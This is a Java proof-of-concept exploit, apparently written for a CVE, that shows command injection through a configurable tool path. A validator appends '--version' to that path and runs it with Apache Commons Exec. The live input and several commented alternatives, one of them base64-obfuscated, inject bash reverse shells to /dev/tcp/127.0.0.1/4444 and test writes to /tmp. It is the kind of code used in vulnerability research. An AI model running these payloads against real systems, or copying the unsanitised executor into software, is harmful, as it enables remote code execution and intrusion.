package com.exp.cve;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;

import org.apache.commons.exec.CommandLine;
import org.apache.commons.exec.DefaultExecutor;
import org.apache.commons.exec.PumpStreamHandler;

public class Main {
 

	public static void main(String[] args) {
//		String input = "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i} || python";
//		String input = "bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/4444 0>&1 || python";
//		String input = "bash -c $@|bash 0 echo 123 > /tmp/1.txt || python";
//		String input = "bash -c \"echo 123 > /tmp/1.txt\" || python";
		String input = "/bin/bash -c bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || python";
		validate("createrepo", input, "[0.9.9,)");
	}
	

	private static void validate(final String type, final String path, final String versionConstraint) {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		try {
			if (commandLineExecutor(path + " --version", baos, baos) == 0) {
				String versionOutput = new String(baos.toByteArray());
				
				String version = parseVersion(type, versionOutput);
				if (version == null) {
					System.out.println("WARNING: Could not determine version!");
				}
					
			} else {
				System.out.println("cmd rst Not 0");
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
		
	public static int commandLineExecutor(final String command, OutputStream out, OutputStream err) throws IOException {
		System.out.println("Execute command : " + command);

		CommandLine cmdLine = CommandLine.parse(command);
		DefaultExecutor executor = new DefaultExecutor();
		executor.setStreamHandler(new PumpStreamHandler(out, err));

		int exitValue = executor.execute(cmdLine);
		System.out.println("Execution finished with exit code : " + exitValue);
		return exitValue;
	}

	private static String parseVersion(final String type, final String rawVersion) {
		try {
			String[] lines = rawVersion.split("\n");
			for (String line : lines) {
				line = line.trim();

				if (line.startsWith(type + " ")) {
					String[] parts = line.split("\\s");
					return parts[1];
				}
			}
		} catch (Exception e) {
			System.out.println("Could not determine version");
			e.printStackTrace();
		}
		return null;
	}


}